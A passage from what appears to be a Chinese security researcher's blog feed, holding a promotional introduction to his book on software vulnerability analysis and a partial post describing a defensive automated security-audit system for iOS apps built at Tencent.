&lt;h4 id=&quot;Q：如何借助本书提升自身的软件漏洞分析能力？&quot;&gt;&lt;a href=&quot;#Q：如何借助本书提升自身的软件漏洞分析能力？&quot; class=&quot;headerlink&quot; title=&quot;Q：如何借助本书提升自身的软件漏洞分析能力？&quot;&gt;&lt;/a&gt;Q：如何借助本书提升自身的软件漏洞分析能力？&lt;/h4&gt;&lt;p&gt;A：本书主要面向有一定软件漏洞基础的读者，如果缺乏这方面的基础，且有一定C语言和汇编语言基础，建议提前看看《0day安全：软件漏洞分析技术》一书。软件漏洞分析是一门实践性比较强的安全领域分支，需要许多实际动手的调试经验，因此建议大家在看本书时，一边看一边动手调试，以加深理解，就像骑自行车一样，熟练之后，哪怕十年未碰，也依然会骑。本书在分析漏洞时，也尽量以思路性地描述为主，以讲解分析漏洞时的思考方式和常用技巧，包括工具和方法论，因此大家在阅读时，应该掌握书中介绍的思考方式、工具运用及分析技巧，毕竟单个漏洞案例本身是会过时的，但技巧性的东西总是可以借鉴和扩展。&lt;br&gt;　　记得大一上第一节历史课时，老师说过这样一句话，如果在未来的某一天，你在和朋友闲聊时，能够运用到历史课上学到的知识，哪怕一句话作为谈资，那这历史课就算没白学。同样地，我也希望未来大家在分析软件漏洞时，本书能够提供一些帮助，哪怕是一个分析技巧，一个工具使用，我也觉得这4年的付出算值了。&lt;br&gt;　　&lt;br&gt;　　纵观近五年，各种APT攻击事件频发，包括知名企业，甚至国家级单位都曾遭受到漏洞攻击。每年都有一款产品的漏洞被频繁用于网络攻击，比如2012年的Office漏洞（还记得经典的CVE-2012-0158吗？），2013年的Java漏洞，2014年的Internet Explorer漏洞，2015年Adobe Flash漏洞。PC端上的软件漏洞一直在逐年增加，虽然厂商在不断地推出各种安全机制，但漏洞利用技术的发展从未间断，Exploiter们依然生存得很好。同时，互联网早已步入移动化时代，伴随着PC软件漏洞攻击事件的频发，移动端的漏洞攻击也在逐年增长。因此，笔者结合PC端（Windows）与移动端（Android）平台上的漏洞案例，历时近4年，将自身的实战经验整理成本书。&lt;/p&gt;
&lt;h4 id=&quot;求学之路&quot;&gt;&lt;a href=&quot;#求学之路&quot; class=&quot;headerlink&quot; title=&quot;求学之路&quot;&gt;&lt;/a&gt;求学之路&lt;/h4&gt;&lt;p&gt;　　经常有人问我：”一个医学生为什么会转行做安全？”，通常我都会这么回答：”因为小说看多了”。&lt;br&gt;　　大一时，由于喜欢看黑客小说，比如《黑客传说》《地狱黑客》《指间的黑客》，就去图书馆找一些黑客书籍学习，每天中午都不休息，几乎天天都泡在图书馆看书，甚至翘课去看计算机书。&lt;br&gt;　　大四才买计算机，在此之前一直都只能去网吧、学校机房或者借用舍友的计算机。当年就用诺基亚3100手机看完了《Windows程序设计》、《Windows核心编程》和《Windows环境下32位汇编语言程序设计》。后来就网购实体书来看，这样比在网吧看电子书更实惠。&lt;br&gt;　　大学期间，经常给《黑客防线》杂志投稿，一方面可以提高个人技术，一方面可以用稿费作为生活补贴，后来就用稿费加上我哥的经济支持，买下了第一台属于自己的计算机，本书就有一半内容是在那台计算机上完成的。&lt;br&gt;　　在求学这条道路上，我一直是一个人默默地前行着，就连一块生活了几年的舍友也不知道我在学习安全方面的知识，我买的一堆计算机书籍一直藏在宿舍衣柜最里面。在此过程中，自己走过很多弯路，甚至多次差点放弃，但很庆幸最后还是坚持下来了，并直至今日，依然在安全这条道路上前行着……&lt;/p&gt;
&lt;h4 id=&quot;面试经历&quot;&gt;&lt;a href=&quot;#面试经历&quot; class=&quot;headerlink&quot; title=&quot;面试经历&quot;&gt;&lt;/a&gt;面试经历&lt;/h4&gt;&lt;p&gt;　　在圈内朋友的建议下，我在大五（医学五年制）上学期开始找安全相关的工作，最终顺利拿到安恒和腾讯的offer。当初投简历给安恒时，安恒的副总裁看完简历后直接发了offer，我有点受宠若惊，也特别感谢安恒的信任，但最终还是选择了腾讯。面试腾讯的经历，我觉得是个有趣的过程，值得与大家分享。&lt;br&gt;　　那年我还在厦门市第二医院骨伤科实习，门诊部刚好不是特别忙，我在给一位腰椎患者做完针灸后，就接到来自腾讯安全中心的面试电话。然后趁主任不在，偷偷躲到门诊部后面的楼梯口进行电话面试，整个面试过程还算比较顺利，第2天腾讯安全中心就来电说希望我到深圳总部面试。&lt;br&gt;　　到了深圳总部后，腾讯安全中心的主管面试了我，虽然聊了一个半小时，但没有问我多少问题，聊完后直接被带去HR那里面试。&lt;br&gt;　　HR面试我时，并非以常规的话题开场，我们是以腰椎间盘突出的话题开场的，也算是一次别开生面的面试经历。&lt;br&gt;　　回到厦门后，我跟带教老师说明了转行情况，之后有上手术台的机会，我都会主动让给其他同班同学，让他们有更多上台练手的机会，而我自己自然有更多的时间去专研安全技术。&lt;/p&gt;
&lt;h4 id=&quot;加入腾讯&quot;&gt;&lt;a href=&quot;#加入腾讯&quot; class=&quot;headerlink&quot; title=&quot;加入腾讯&quot;&gt;&lt;/a&gt;加入腾讯&lt;/h4&gt;&lt;p&gt;　　腾讯是我的第一家雇主，也是目前我唯一工作过的公司，从我毕业一直工作到现在。在公司我见证了腾讯安全应急响应中心（TSRC）的成立与发展，帮助完善各种流程和标准，作为早期主要的漏洞审核者，我也从广大白帽子身上学到很多东西，包括各种漏洞挖掘与利用技术，涉及各个安全领域，如Web安全、驱动安全、应用软件安全、移动安全等，正是TSRC给了我更多学习的机会，使得我在安全技术上能够更加全面地发展。除此之外，我在公司也做一些安全研究工作，并研发出Android与iOS应用安全审计系统，已投入公司日常运营使用。&lt;br&gt;　　至今，我依然觉得工作能够与兴趣结合在一起，是一件既幸福又幸运的事，而选择腾讯依然是我当年的明智之举。&lt;/p&gt;
&lt;h4 id=&quot;著书感言&quot;&gt;&lt;a href=&quot;#著书感言&quot; class=&quot;headerlink&quot; title=&quot;著书感言&quot;&gt;&lt;/a&gt;著书感言&lt;/h4&gt;&lt;p&gt;　　本书是我写的第一本书，也可能是最后一本技术书籍，只有自己经历了著书过程，才知道写书的不易。特别是类似本书这种以漏洞实例进行调试分析的书，写起来特别费时，也更需要有持之以恒之的毅力。如果说单纯写书用掉1年时间，那么我用来调试的时间大约是3年，因此可以说这是”一本用调试器写出来的书”。&lt;br&gt;　　“开头容易，收尾难”是个人著书的真实感受，很多人一时兴起写了开头，最后很难坚持下去，导致夭折了不少著作。
　　&lt;/p&gt;
&lt;h4 id=&quot;本书结构&quot;&gt;&lt;a href=&quot;#本书结构&quot; class=&quot;headerlink&quot; title=&quot;本书结构&quot;&gt;&lt;/a&gt;本书结构&lt;/h4&gt;&lt;p&gt;　　本书共12章，可以分为三大部分。&lt;br&gt;　　基础篇（第1章）：主要介绍一些软件漏洞相关的基本概念，以及常用工具及漏洞分析方法，最后向读者推荐一些相关的学习站点和书籍，方便读者做进一步地学习和交流。&lt;br&gt;　　实战篇（第2~11章）：是本书最主要的部分，根据不同的漏洞类型挑选不同的经典案例，用不同的漏洞分析技巧，向读者介绍比较高效的分析方法，剖析各种常见的软件漏洞类型、原理、利用和修复的实战技术。同时，紧跟当前热门的移动互联网安全问题，增加了Android平台的漏洞分析，以保持内容与时俱进。&lt;br&gt;　　展望篇（第12章）：对未来的软件漏洞发展趋势做出预判，相信未来的主要战场会更集中在移动终端、云计算平台、物联网三大方向上，并对现有的这些方向的漏洞案例进行简要介绍。&lt;/p&gt;
&lt;h4 id=&quot;致谢&quot;&gt;&lt;a href=&quot;#致谢&quot; class=&quot;headerlink&quot; title=&quot;致谢&quot;&gt;&lt;/a&gt;致谢&lt;/h4&gt;&lt;p&gt;　　感谢我父母的养育之恩，是他们在背后默默地支持我前行。&lt;br&gt;　　感谢我的兄长在生活和工作上对我的帮助与支持。&lt;br&gt;　　感谢我的女朋友，正是她的督促和支持才让我能够准时完稿，并且书中有些截图是经过她后期制作的，以便使得图片的印刷效果更好。&lt;br&gt;　　感谢我的姑母长期以来对我生活上的关心与照顾。&lt;br&gt;　　感谢我的公司腾讯，它所营造的良好氛围，使我的技术水平和在职场的发展都更上一层楼。同时也感谢在工作中一直给予我帮助和鼓励的同事和领导，由于人数较多，就不一一列举。&lt;br&gt;　　感谢王清先生为本书作序，他所著书籍一直是软件安全行业的经典。&lt;br&gt;　　感谢博文视点的编辑皎子、郑柳洁及她们的团队，正是他们的努力才使得本书最终能够与大家见面。&lt;br&gt;　　感谢各位圈内的朋友，他们包括但不限于（排名不分先后）：wushi、爱无言、仙果、wingdbg、instruder、kanxue、lake2、harite、h4ckmp、dragonltx、非虫、monster、gmxp、古河、冰雪风谷、KiDebug、KK……&lt;br&gt;　　由于作者水平有限，书中难免有误，欢迎各位业界同仁斧正！&lt;/p&gt;
&lt;h3 id=&quot;序言&quot;&gt;&lt;a href=&quot;#序言&quot; class=&quot;headerlink&quot; title=&quot;序言　　&quot;&gt;&lt;/a&gt;序言　　&lt;/h3&gt;&lt;p&gt;独乐乐，与人乐乐，孰乐？&lt;/p&gt;
&lt;p&gt;不断向底层钻研的技术深度，创造性的广度思维，契而不舍地执着追求是成为优秀的安全研究员所必备的基础素质，无疑riusksk全都具备。&lt;/p&gt;
&lt;p&gt;单论技术本身，问世间，是否此山最高，没有人能说的清楚。但是我在书目中还看到了许多超出技术的其他元素:有精益求精、追求完美的极客精神；有循序渐进、耐心引导的导师身影；有架构明晰，逻辑严谨的整体设计感；最能打动我的，其实是那份炽热的分享精神，毫无保留地去帮助那些还在摸索中学习的朋友。&lt;/p&gt;
&lt;p&gt;一代宗师除了不断修炼自己之外，还需要将自己的智慧发扬传承，我在书中看到了这样的影子。&lt;/p&gt;
&lt;h4 style=&quot;text-align:right&quot;&gt;《0day安全：软件漏洞分析技术》作者，北京子衿晨风科技有限公司CEO  failwest &lt;/h4&gt;


&lt;h3 id=&quot;媒体评论&quot;&gt;&lt;a href=&quot;#媒体评论&quot; class=&quot;headerlink&quot; title=&quot;媒体评论　　&quot;&gt;&lt;/a&gt;媒体评论　　&lt;/h3&gt;&lt;p&gt;本书对近年来影响比较大的漏洞一一详细剖析，于细节处可以看出作者的功力，对于漏洞攻防领域是一本不可多得的原创好书。&lt;br&gt;　　读者可以对照着动手调试这些经典漏洞，我相信只要认真做一遍，功力会大增。&lt;/p&gt;
&lt;h4 style=&quot;text-align:right&quot;&gt;– 腾讯科恩实验室总监 wushi&lt;/h4&gt;

&lt;p&gt;　　过去的几年，我们见证了移动互联网的兴起，也见证了软件漏洞战场从PC端向移动端的迁移。本书从这个视角出发，结合实例、深入浅出、涵盖全面，是学习软件漏洞的绝佳之选。同时本书作者riusksk（泉哥）在腾讯安全应急响应中心负责软件漏洞的处理和研究，有着丰富的实战经验。强烈推荐！&lt;/p&gt;
&lt;h4 style=&quot;text-align:right&quot;&gt;—— 腾讯安全平台部总监 lake2&lt;/h4&gt;

&lt;p&gt;安全漏洞的挖掘与分析是隐秘且难度较高的一门技术，系统性的学习资料更是少之又少。本书以近年来报告出的经典漏洞为蓝本，分析并讲解了常见的各种系统及软件漏洞的成因及攻击方法，通过对这些精彩漏洞实例的全面讲解，相信读者对软件漏洞技术会有更加全面的认识。并且随着全书内容的展开，读者一定会与我一样，被漏洞挖掘者的聪明与智慧深深所折服。&lt;/p&gt;
&lt;h4 style=&quot;text-align:right&quot;&gt;—— 软件安全专家，《Android软件安全与逆向分析》及《Mac OS X软件安全与逆向分析》作者 丰生强&lt;/h4&gt;

&lt;p&gt;对软件漏洞进行分析研究是提高软件安全技术水平的途径之一，他山之石可以攻玉，这本书为我们提供了一个很好的开始，值得认真学习。移动平台的漏洞研究是当下的热点，这本书与时俱进地纳入了这一部分内容，不可不读也！&lt;/p&gt;
&lt;h4 style=&quot;text-align:right&quot;&gt;—— 自由安全研究者，《挖0day》作者 爱无言&lt;/h4&gt;

&lt;p&gt;这是自《0day安全：软件漏洞分析技术》以来，又一本关于二进制漏洞分析最全面的力作书籍，该书籍结合新的经典漏洞与新型分析方法，深度剖析不同类型的安全漏洞，结合不同的分析方法，做到授人以渔。相信能够帮助那些希望从事安全行业的人员，为其提供更好的帮助。&lt;/p&gt;
&lt;h4 style=&quot;text-align:right&quot;&gt;—— 阿里安全威胁情报中心  安全专家 instruder&lt;/h4&gt;

&lt;p&gt;随着互联网的蓬勃发展，安全漏洞也跟着逐年爆发。未知攻，焉知防！因此，如何快速分析漏洞成因是安全研究员必备的一项技能。本书涵盖了各种各样的漏洞类型，覆盖了PC端和移动端，极具实战性和全面性，兼具实用性和时效性，干货满满，是安全研究员提高漏洞分析能力的利器。俱往矣，数漏洞分析，还看此书！&lt;/p&gt;
&lt;h4 style=&quot;text-align:right&quot;&gt;—— 阿里巴巴移动安全 dragonltx&lt;/h4&gt;




</content>
    
    <summary type="html">
    
      &lt;p&gt;&lt;br&gt;&lt;/p&gt;
&lt;center&gt;&lt;img src=&quot;/media/book.png&quot; alt=&quot;&quot;&gt;&lt;/center&gt;

&lt;h3 id=&quot;购买地址&quot;&gt;&lt;a href=&quot;#购买地址&quot; class=&quot;headerlink&quot; title=&quot;购买地址　&quot;&gt;&lt;/a&gt;购买地址　&lt;/h3&gt;&lt;p&gt;&lt;a href=&quot;http://product.china-pub.com/4971073#qy&quot;&gt;China-Pub&lt;/a&gt;&lt;br&gt;&lt;a href=&quot;http://search.jd.com/Search?keyword=%E6%BC%8F%E6%B4%9E%E6%88%98%E4%BA%89&amp;amp;enc=utf-8&amp;amp;wq=%E6%BC%8F%E6%B4%9E%E6%88%98%E4%BA%89&amp;amp;pvid=3wfwj4qi.gk4kteggu1ql3#keyword=%E6%BC%8F%E6%B4%9E%E6%88%98%E4%BA%89&amp;amp;enc=utf-8&amp;amp;qrst=1&amp;amp;rt=1&amp;amp;stop=1&amp;amp;vt=2&amp;amp;psort=2&amp;amp;click=2&quot;&gt;京东&lt;/a&gt;&lt;br&gt;&lt;a href=&quot;https://world.taobao.com/search/search.htm?sort=price&amp;amp;_ksTS=1467426638963_384&amp;amp;spm=a21bp.7806943.20151106.1&amp;amp;search_type=0&amp;amp;json=on&amp;amp;cna=L%20rnC6dL4EYCATr7VsQhHYop&amp;amp;module=sortList&amp;amp;_input_charset=utf-8&amp;amp;navigator=all&amp;amp;s=0&amp;amp;q=%E6%BC%8F%E6%B4%9E%E6%88%98%E4%BA%89%EF%BC%9A%E8%BD%AF%E4%BB%B6%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90%E7%B2%BE%E8%A6%81&amp;amp;callback=__jsonp_cb&amp;amp;abtest=_AB-LR517-LR854-LR895-PR517-PR854-PV895_2462&quot;&gt;淘宝&lt;/a&gt;&lt;br&gt;&lt;a href=&quot;http://product.dangdang.com/1027799065.html&quot;&gt;当当&lt;/a&gt;&lt;br&gt;&lt;a href=&quot;https://www.amazon.cn/%E6%BC%8F%E6%B4%9E%E6%88%98%E4%BA%89-%E8%BD%AF%E4%BB%B6%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90%E7%B2%BE%E8%A6%81-%E6%9E%97%E6%A1%A0%E6%B3%89/dp/B01I2ZVN5U/&quot;&gt;亚马逊&lt;/a&gt;&lt;/p&gt;
&lt;h3 id=&quot;编辑推荐&quot;&gt;&lt;a href=&quot;#编辑推荐&quot; class=&quot;headerlink&quot; title=&quot;编辑推荐　&quot;&gt;&lt;/a&gt;编辑推荐　&lt;/h3&gt;&lt;p&gt;《漏洞战争：软件漏洞分析精要》是这些年来难得一见的系统、全面深入分析漏洞攻防心要与战术的书籍。《漏洞战争：软件漏洞分析精要》结合经典的漏洞案例，从攻防思路、分析方法与实战等方面对漏洞攻防做了详细的阐述。既照顾了全局的视野，又不失细节上的周到，对于有志于安全事业并想在安全技术分析上有所提升的读者，这是一本可信赖的必备书籍。正如wushi老师所说：”……对照本书动手调试这些经典漏洞，我相信只要认真做一遍，功力会大增。”&lt;br&gt;还犹豫什么呢，好书，一本就够！&lt;/p&gt;
&lt;h3 id=&quot;内容简介&quot;&gt;&lt;a href=&quot;#内容简介&quot; class=&quot;headerlink&quot; title=&quot;内容简介&quot;&gt;&lt;/a&gt;内容简介&lt;/h3&gt;&lt;p&gt;《漏洞战争：软件漏洞分析精要》系统地讲解软件漏洞分析与利用所需的各类工具、理论技术和实战方法，主要涉及Windows 和Android 系统平台。《漏洞战争：软件漏洞分析精要》根据不同的软件漏洞类型划分，比如堆栈溢出、沙盒逃逸、类型混淆、UAF、内核漏洞等，同时又针对当前流行的移动安全，加入Android 平台上的漏洞分析与利用。以精心挑选的经典漏洞为例，以分享漏洞的分析技巧和工具为主，对这些漏洞的成因、利用及修复方法进行详细讲解，旨在”授之以渔”。《漏洞战争：软件漏洞分析精要》最大的特点是以各种类型的经典漏洞作为实战讲解，摒弃空头理论，几乎是”一本用调试器写出来的书”。&lt;br&gt;《漏洞战争：软件漏洞分析精要》适合计算机相关专业的本科及研究生，信息安全爱好者，软件安全及移动安全相关的安全从业人员，软件开发与测试人员、黑客等阅读。 &lt;/p&gt;
    
    </summary>
    
      <category term="随笔杂谈" scheme="http://riusksk.github.io/categories/%E9%9A%8F%E7%AC%94%E6%9D%82%E8%B0%88/"/>
    
    
      <category term="书籍" scheme="http://riusksk.github.io/tags/%E4%B9%A6%E7%B1%8D/"/>
    
  </entry>
  
  <entry>
    <title>浅谈iOS应用安全自动化审计</title>
    <link href="http://riusksk.github.io/2016/06/23/ios-auditor/"/>
    <id>http://riusksk.github.io/2016/06/23/ios-auditor/</id>
    <published>2016-06-22T16:00:00.000Z</published>
    <updated>2016-06-26T09:35:57.000Z</updated>
    
    <content type="html">&lt;h3 id=&quot;前言&quot;&gt;&lt;a href=&quot;#前言&quot; class=&quot;headerlink&quot; title=&quot;前言&quot;&gt;&lt;/a&gt;前言&lt;/h3&gt;&lt;p&gt;此前有人统计过2015年漏洞最多的产品，苹果的OSX与iOS系统分别占据第一二名，虽有人怀疑统计数据可能存在重复的不准确情况，但相信大趋势是不会变的。&lt;/p&gt;
&lt;p&gt;2015年在iOS平台上也发生过不少安全大事，比如“XcodeGhost”事件、iOS9越狱、“iBackDoor“、“YouMi“事件等等，尤其是XcodeGhost影响甚大，注定要在iOS安全史上留下重重的一笔。&lt;/p&gt;
&lt;p&gt;结合CVEDetails站点上对iOS系统漏洞的统计情况【图1】，整体处于上升的趋势，尤其是2015年增长迅速，是2014年的3倍多，由此也可以预见iOS平台上的安全漏洞正在快速增长，iOS应用亦然。&lt;/p&gt;
&lt;center&gt;&lt;br&gt;&lt;img src=&quot;/media/ios_auditor/1.png&quot; alt=&quot;&quot;&gt;&lt;br&gt;图1：iOS系统历年漏洞数量统计图&lt;br&gt;&lt;/center&gt;

&lt;a id=&quot;more&quot;&gt;&lt;/a&gt;
&lt;p&gt;腾讯也有很多iOS应用产品，基本上android上有的，对应的同款应用在iOS上也会有。目前Android应用的审计技术在业界都已经于相对成熟，而iOS应用漏洞审计系统在国内还是比较欠缺的，一些公司可能内部有开发，只是未公开。&lt;/p&gt;
&lt;p&gt;此前腾讯iOS产品也是未能做有效的上线前审计，遗留一些安全隐患，因此我们对此专门研发了一款针对iOS应用的自动化审计系统。除了日常的应用审计外，同时也是希望它能够在安全应急上起到辅助的作用。本文主要就是针对它使用到的一些技术进行浅谈，以希望可以起到抛砖引玉的效果。&lt;/p&gt;
&lt;h3 id=&quot;开发环境&quot;&gt;&lt;a href=&quot;#开发环境&quot; class=&quot;headerlink&quot; title=&quot;开发环境&quot;&gt;&lt;/a&gt;开发环境&lt;/h3&gt;&lt;p&gt;• Mac OS X 10.11&lt;br&gt;• Python 开发环境：PyCharm5&lt;br&gt;• Objective-C 开发环境：Xcode7 + iOSOpenDev&lt;br&gt;• 支持 iOS 8.1 以上的越狱系统&lt;/p&gt;
&lt;h3 id=&quot;系统架构&quot;&gt;&lt;a href=&quot;#系统架构&quot; class=&quot;headerlink&quot; title=&quot;系统架构&quot;&gt;&lt;/a&gt;系统架构&lt;/h3&gt;&lt;p&gt;整个iOS应用审计系统主要分两部分：静态审计和动态审计【图2】。静态审计包括Bin文件漏洞审计、第三方库检测以及私有API静态检测等功能；动态审计主要通过Hook去监控网络数据包、SSL中间人检测，以及实现ipa的动态安装和运行、文件上传下载等基本功能。&lt;/p&gt;
&lt;center&gt;&lt;br&gt;&lt;img src=&quot;/media/ios_auditor/2.png&quot; alt=&quot;&quot;&gt;&lt;br&gt;图2：iOS应用审计系统架构图&lt;br&gt;&lt;/center&gt;

&lt;h3 id=&quot;基本审计功能&quot;&gt;&lt;a href=&quot;#基本审计功能&quot; class=&quot;headerlink&quot; title=&quot;基本审计功能&quot;&gt;&lt;/a&gt;基本审计功能&lt;/h3&gt;&lt;p&gt;通过静态审计提取基本的文件信息，并以较好的展示效果输出到报告页面上【图3】，也方便后面的二次扫描，以及鉴别不同的ipa文件。&lt;/p&gt;
&lt;center&gt;&lt;br&gt;&lt;img src=&quot;/media/ios_auditor/3.png&quot; alt=&quot;&quot;&gt;&lt;br&gt;    图3：文件信息及漏洞统计图&lt;br&gt;    &lt;/center&gt;

&lt;p&gt;在静态审计里最重要的就是Bin文件漏洞检测功能【图4】，像编译选项和使用函数的信息，借助otool即可很容易检测。&lt;/p&gt;
&lt;p&gt;应用漏洞检测主要针对目前已公开的漏洞/恶意后门进行检测，比如XcodeGhost、iBackDoor、AFNetworking等等，先通过分析样本来制定静态检测规则，多数通过关键字符串即可检测出，而对于AFNetworking SSL中间人漏洞，笔者是采用检测漏洞相关的ARM指令。&lt;/p&gt;
&lt;center&gt;&lt;br&gt;&lt;img src=&quot;/media/ios_auditor/4.png&quot; alt=&quot;&quot;&gt;&lt;br&gt;图4：BIN静态审计功能&lt;br&gt;&lt;/center&gt;

&lt;p&gt;下面是AFNetworking某个漏洞版本的ARM指令【图5】，不同版本会有一定差异，所以还是需要对比多个不同版本，提取通用的检测规则（单纯检测下图标红的ARM指令会误报）。除此之外，还要对比修复版本的代码，避免误报。&lt;/p&gt;
&lt;center&gt;&lt;br&gt;&lt;img src=&quot;/media/ios_auditor/5.png&quot; alt=&quot;&quot;&gt;&lt;br&gt;图5：AFNetworking SSL 中间人漏洞代码&lt;br&gt;&lt;/center&gt;

&lt;p&gt;由于iOS应用为了兼容性，都会包含32位与64位程序，很少会单纯只使用64位编译的应用，所以检测时可以暂不用考虑64位问题。&lt;/p&gt;
&lt;p&gt;除图4上的应用漏洞之外，还支持自定义审计功能【图6】，主要是为了在应急时，可以及时即时制定规则进行批量扫描【图7】，我们也专门针对公司业务情况添加了一些规则，此处就不赘述了。&lt;/p&gt;
&lt;center&gt;&lt;br&gt;&lt;img src=&quot;/media/ios_auditor/6.png&quot; alt=&quot;&quot;&gt;&lt;br&gt;图6：自定义审计规则示例（非实际运用规则）&lt;br&gt;&lt;br&gt;&lt;img src=&quot;/media/ios_auditor/7.png&quot; alt=&quot;&quot;&gt;&lt;br&gt;图7：应用批量扫描&lt;br&gt;&lt;/center&gt;

&lt;p&gt;上面【图6】只是一份示例的规则，并非在系统上实际运用的，只是作为演示，它支持二进制、数据库及文件的扫描，里面可以使用linux命令去辅助检测，当然你也可以笑称它为“后门”。&lt;/p&gt;
&lt;p&gt;另外，数据存储安全和网络传输安全都在动态审计部分完成，审计规则在自定义规则里面定义的。其中网络实时检测功能主要是基于Hook实现的，针对发包函数进行监控，比如NSURLConnection:sendSynchronousRequest 或者UIApplication:openURL等等【图8】。&lt;/p&gt;
&lt;center&gt;&lt;br&gt;&lt;img src=&quot;/media/ios_auditor/8.png&quot; alt=&quot;&quot;&gt;&lt;br&gt;图8：通过Hook网络相关API实现监听&lt;br&gt;&lt;/center&gt;

&lt;p&gt;程序会实时监听HTTP、HTTPS甚至是自定义伪协议的请求，而且为方便后续测试会记录cookie值，然后完整地输出到报告上【图9】，后续也可以把它导入扫描器作WEB漏洞扫描。&lt;/p&gt;
&lt;center&gt;&lt;br&gt;&lt;img src=&quot;/media/ios_auditor/9.png&quot; alt=&quot;&quot;&gt;&lt;br&gt;图9：网络请求实时监控&lt;br&gt;&lt;/center&gt;

&lt;p&gt;由于著名第三方库AFNetwork经常被使用，因此笔者也增加了对它的网络监控。&lt;/p&gt;
&lt;h3 id=&quot;UI界面遍历&quot;&gt;&lt;a href=&quot;#UI界面遍历&quot; class=&quot;headerlink&quot; title=&quot;UI界面遍历&quot;&gt;&lt;/a&gt;UI界面遍历&lt;/h3&gt;&lt;p&gt;为了触发更多地程序逻辑，增加代码覆盖率，在动态检测时，就需要去遍历各个UI界面。对于这种情况，我们选用appcrawler工具进行UI遍历，它同时支持Android与iOS应用，而在其提供的config.json配置文件里面，可根据自身需要去灵活配置，比如遍历的深度，匹配文本框关键字进行输入（如登录帐号），这些规则需要自己多测试应用去完善它。【图10】是遍历微信UI的部分截图效果，由于只遍历了10分钟，所以截图相对较少一些，整体效果还是不错的。&lt;/p&gt;
&lt;center&gt;&lt;br&gt;&lt;img src=&quot;/media/ios_auditor/10.png&quot; alt=&quot;&quot;&gt;&lt;br&gt;图10：遍历微信UI的部分截图&lt;br&gt;&lt;/center&gt;

&lt;h3 id=&quot;SSL中间人检测&quot;&gt;&lt;a href=&quot;#SSL中间人检测&quot; class=&quot;headerlink&quot; title=&quot;SSL中间人检测&quot;&gt;&lt;/a&gt;SSL中间人检测&lt;/h3&gt;&lt;p&gt;在移动APP中，无论是Android还是iOS平台，SSL中间人攻击都是一种常见漏洞，经常是由于证书校验不严谨导致的。虽然是中间人攻击，但在一定场景下还可以造成很大的危害，尤其是金融场所里面的WiFi，常常是最好的攻击点。&lt;/p&gt;
&lt;p&gt;针对SSL中间人漏洞，如果采用静态代码检测，可能误报率会比较高，笔者在此处是通过Hook做静态检测，在运行时注入证书异常站点的请求，然后再去检测是否访问成功【图11】。&lt;/p&gt;
&lt;center&gt;&lt;br&gt;&lt;img src=&quot;/media/ios_auditor/11.png&quot; alt=&quot;&quot;&gt;&lt;br&gt;图11：SSL中间人动态检测原理&lt;br&gt;&lt;/center&gt;

&lt;p&gt;以QQ浏览器HD为例，注入异常站点后会弹出【图12】中的提示，说明不会自动连接此站点，因此不存在SSL中间人漏洞。&lt;/p&gt;
&lt;center&gt;&lt;br&gt;&lt;img src=&quot;/media/ios_auditor/12.png&quot; alt=&quot;&quot;&gt;&lt;br&gt;图12：检测效果&lt;br&gt;&lt;/center&gt;

&lt;p&gt;不过对于使用第三方SSL库的应用可能会漏报，另一种替代方案是使用证书替换的检测方式，不过这会导致访问异常，最终可能导致应用无法正常使用，后续的审计动作也将被中止。各有各的弊端，可以暂时两者分开地使用，如果各位同仁有更好的检测方法，也欢迎在下面回复讨论。&lt;/p&gt;
&lt;h3 id=&quot;私有API检测&quot;&gt;&lt;a href=&quot;#私有API检测&quot; class=&quot;headerlink&quot; title=&quot;私有API检测&quot;&gt;&lt;/a&gt;私有API检测&lt;/h3&gt;&lt;p&gt;虽说调用私有API不算漏洞，但因为苹果严格的审计机制，一经发现调用私有API会直接下架应用，对业务影响也是很大。&lt;/p&gt;
&lt;p&gt;另外从安全角度看，如果应用的漏洞修复版本需要发布，但多次因为调用私有API也被苹果官方拒绝上架，就会导致漏洞无法得到及时的修复。&lt;/p&gt;
&lt;p&gt;检测私有API的难点主要在于苹果未公开这份私有API列表，因此在检测时只能自己提取，但也导致会因此存在一定的漏报和误报的情况。&lt;/p&gt;
&lt;p&gt;网络上有个提取私有API的公式：&lt;/p&gt;
&lt;blockquote&gt;
&lt;p&gt;私有的api ＝ (class-dump Framework下的库生成的头文件中的api - (Framework下的头文件里的api = 有文档的api + 没有文档的api)) + PrivateFramework下的api&lt;/p&gt;
&lt;/blockquote&gt;
&lt;p&gt;其实这是不完全正确的，如果你单纯按照这种方法提取，会出现很高的误报和漏报情况。因为私有类里面有公有API，公有类里面有私有API。但上面的公式是提取私有API的第一步，之后就需要再做很多提取规则逐步完善，比如一些纯小写字母的api，大多是一些c库函数，可以再过滤一大批。&lt;/p&gt;
&lt;p&gt;这种没有什么特别好的方法，只能多扫应用，根据结果多优化规则。&lt;/p&gt;
&lt;p&gt;Github上面也有用于检测私有API的开源项目，但基本上没有一个可以满足测试需求的，误报率和漏报率太高，而且支持iOS版本较低。iOS9 SDK以上版本，也不能直接使用classdump去提取头文件，因为应用的符号表已经被去掉这些信息，笔者是采用nm去解决的。&lt;/p&gt;
&lt;p&gt;最初笔者是打算把动态检测私有API也做了，但后面考虑审计系统主要是面向公司内部，因此不存在那种恶意绕过私有API检测的行为，然后就把写了一半的动态检测功能给注释掉。&lt;/p&gt;
&lt;p&gt;如果读者要做动态检测私有API，那么误报和性能就是首要考虑的问题。hook太深，则消息过多，时耗过多，而且有些是系统自身调用的私有API，就无法正确区分是应用还是系统调用的；hook太浅，又达不到效果，没法监测到私有API的行为。这里抛张动态检测的半成品截图【图13】，大家可以继续发挥。&lt;/p&gt;
&lt;center&gt;&lt;br&gt;&lt;img src=&quot;/media/ios_auditor/13.png&quot; alt=&quot;&quot;&gt;&lt;br&gt;图13：动态检测私有API时的Hook日志（半成品）&lt;br&gt;&lt;/center&gt;

&lt;p&gt;为了提高静态检测的准确率，笔者就把静态拼接API字符串的情况也支持【图14】，因为正常情况下，两个字符串都是相邻的，组合起来再与私有API库作比较即可。&lt;/p&gt;
&lt;center&gt;&lt;br&gt;&lt;img src=&quot;/media/ios_auditor/14.png&quot; alt=&quot;&quot;&gt;&lt;br&gt;图14：字符串拼接绕过私有API检测&lt;br&gt;&lt;/center&gt;

&lt;p&gt;好了，说了这么多，直接上一张实战图。下面【图15】是针对去年曝光的一款iOS病毒TinyV做的检测（感谢ClaudXiao分享的样本），可以看到它调用LSApplicationWorkspace和MobileInstallation中的私有API去查看安装程序列表，安装和卸载应用。&lt;/p&gt;
